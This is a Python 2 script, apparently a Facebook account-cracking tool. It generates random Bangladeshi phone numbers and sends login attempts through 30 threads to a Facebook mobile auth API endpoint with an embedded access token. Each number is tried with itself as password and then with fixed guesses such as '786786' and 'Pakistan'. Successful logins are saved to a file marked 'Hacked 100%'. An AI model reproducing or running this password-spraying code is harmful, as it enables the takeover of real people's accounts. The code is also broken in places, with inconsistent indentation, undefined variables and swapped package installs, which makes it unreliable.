# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;92m _______  _______  _______ _________
\033[1;93m(  ____ \(  ___  )(       )\__   __/
\033[1;94m| (    \/| (   ) || () () |   ) (   
\033[1;93m| (_____ | |   | || || || |   | |   
\033[1;96m(_____  )| |   | || |(_)| |   | |   
\033[1;91m      ) || |   | || |   | |   | |   
\033[1;92m/\____) || (___) || )   ( |___) (___
\033[1;93m\_______)(_______)|/     \|\_______/
                                    

"""
logo1 = """
\033[1;90m
\033[1;92m _______  _______  _______ _________
\033[1;93m(  ____ \(  ___  )(       )\__   __/
\033[1;94m| (    \/| (   ) || () () |   ) (   
\033[1;93m| (_____ | |   | || || || |   | |   
\033[1;96m(_____  )| |   | || |(_)| |   | |   
\033[1;91m      ) || |   | || |   | |   | |   
\033[1;92m/\____) || (___) || )   ( |___) (___
\033[1;93m\_______)(_______)|/     \|\_______/

"""


##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m[1]\x1b[1;93m BANGLADESH"
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m Exit ( Back)'
    pilih_login()

def pilih_login():
    somi = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
    if somi =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif somi =="1":
        somi()
def somi():
                print (logo1)
		os.system("clear")
		print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			somi()
	elif somi =='0':
		login()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	jalan ('➙\033[1;96m TOTAL IDS NUMBER : '+xxx)
    jalan ('➙\033[1;92m CODE YOU CHOOSE: '+c)
    jalan ("➙\033[1;93m PLEASE WAIT, PROCESS IS START ..")
    jalan ("➙\033[1;91m TO STOP THIS PROCESS PRESS Ctrl THEN z")
	time.sleep(0.05)
	print 44*'-'
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[Cp] ' + k + c + user + '  》  ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786"
 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;97m[Cp] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
 					        cps.close()
 					        cpb.append(c+user+pass2)
                                        else:
 				            pass3="Pakistan"
 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
 				                okb.close()
 				                oks.append(c+user+pass3)
 				            else:
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;97m[Cp] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
 					                cps.close()
 					                cpb.append(c+user+pass3)
                                                else:
 				                    pass4="Mim123"
 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
 				                        okb.close()
 				                        oks.append(c+user+pass4)
 				                    else:
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;97m[Cp] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
 					                        cps.close()
 					                        cpb.append(c+user+pass4)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	
	print """
"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()

    

